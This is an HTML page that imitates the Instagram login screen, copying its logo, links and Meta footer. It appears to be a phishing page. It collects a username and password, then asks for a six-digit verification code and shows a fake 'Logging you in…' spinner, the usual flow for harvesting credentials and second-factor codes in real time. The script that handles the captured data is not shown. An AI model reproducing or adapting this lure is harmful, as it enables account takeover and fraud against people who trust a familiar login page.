<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Instagram</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2024%2024'%3E%3Cdefs%3E%3ClinearGradient%20id='g'%20x1='0%25'%20y1='100%25'%20x2='100%25'%20y2='0%25'%3E%3Cstop%20offset='0%25'%20stop-color='%23feda75'/%3E%3Cstop%20offset='25%25'%20stop-color='%23fa7e1e'/%3E%3Cstop%20offset='50%25'%20stop-color='%23d62976'/%3E%3Cstop%20offset='75%25'%20stop-color='%23962fbf'/%3E%3Cstop%20offset='100%25'%20stop-color='%234f5bd5'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect%20x='2'%20y='2'%20width='20'%20height='20'%20rx='6'%20fill='none'%20stroke='url(%23g)'%20stroke-width='2'/%3E%3Ccircle%20cx='12'%20cy='12'%20r='4.5'%20fill='none'%20stroke='url(%23g)'%20stroke-width='2'/%3E%3Ccircle%20cx='17.5'%20cy='6.5'%20r='1.2'%20fill='url(%23g)'/%3E%3C/svg%3E">
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
<link rel="stylesheet" href="/static/style.css">
</head>
<body>

<div class="wrap">
  <div class="inner">

    <!-- STEP 1: LOGIN -->
    <div class="card step active" id="step-login">
      <div class="logo">Instagram</div>
      <form class="form" id="login-form" autocomplete="off">
        <input class="hp" type="text" name="website" tabindex="-1" autocomplete="off" aria-hidden="true">
        <div class="field">
          <input type="text" id="username" placeholder=" " required>
          <label for="username">Phone number, username, or email</label>
        </div>
        <div class="field">
          <input type="password" id="password" placeholder=" " required>
          <label for="password">Password</label>
          <span class="show-pw" id="toggle-pw">Show</span>
        </div>
        <button type="submit" class="btn" id="login-btn">Log in</button>
      </form>
      <div class="divider"><span>OR</span></div>
      <a class="fb-login" href="#" id="fb-login">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
        Log in with Facebook
      </a>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <!-- STEP 2: 2FA -->
    <div class="card step" id="step-2fa">
      <div class="logo">Instagram</div>
      <p class="step-title">Enter the 6-digit code</p>
      <p class="step-sub" id="step-sub-2fa">We sent a verification code to your phone. Enter it below to continue.</p>
      <form id="code-form">
        <div class="code-inputs" id="code-boxes">
          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" aria-label="digit 1">
          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" aria-label="digit 2">
          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" aria-label="digit 3">
          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" aria-label="digit 4">
          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" aria-label="digit 5">
          <input type="text" maxlength="1" inputmode="numeric" pattern="\d" aria-label="digit 6">
        </div>
        <div class="err" id="code-err">Please enter all 6 digits.</div>
        <div style="padding:0 40px">
          <button type="submit" class="btn" id="code-btn">Confirm</button>
        </div>
      </form>
      <div style="margin-top:18px"><a href="#" class="forgot">Resend code</a></div>
    </div>

    <!-- STEP 3: LOADING -->
    <div class="card step" id="step-loading">
      <div class="logo">Instagram</div>
      <p class="loading-text"><span class="spinner"></span>Logging you in…</p>
    </div>

    <!-- SIGNUP CARD -->
    <div class="card2" id="signup-card">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <!-- APP BADGES -->
    <div class="app">
      <p>Get the app.</p>
      <div class="app-badges">
        <a href="#" class="app-badge">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.4c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.95 1.95-1.59 3.04-1.56.14 1.18-.36 2.35-1.14 3.19-.73.85-1.92 1.51-3.05 1.42-.15-1.15.41-2.33 1.15-3.05"/></svg>
          <span><small>Download on the</small>App Store</span>
        </a>
        <a href="#" class="app-badge">
          <svg width="14" height="14" viewBox="0 0 24 24"><path fill="#34a853" d="M3.6 2.3l9.4 8.3-.9.8-8.5-8.5c0-.2.1-.5.4-.6z"/><path fill="#fbbc04" d="M12.1 11.3l-8.4 8.4c-.3-.1-.4-.4-.4-.6l8.5-8.5.3.7z"/><path fill="#ea4335" d="M21.8 12l-3.2 1.9-6.5-5.8 3.2-1.9c.5-.3 1.1-.3 1.6 0L21.8 12z"/><path fill="#4285f4" d="M3.6 2.3c.3-.2.7-.2 1 0l9.5 5.5-1.4 1.5-8.5-8.5-.6-.3v1.8z"/><path fill="#34a853" d="M3.2 21.7c-.2-.2-.2-.4-.2-.7V3c0-.3 0-.5.2-.7l9.4 9-9.4 10.4z"/></svg>
          <span><small>GET IT ON</small>Google Play</span>
        </a>
      </div>
    </div>
  </div>
</div>

<footer>
  <div class="foot-links">
    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
    <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
    <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
  </div>
  <div class="foot-copy">© 2024 Instagram from Meta</div>
</footer>

<script src="/static/script.js"></script>
</body>
</html>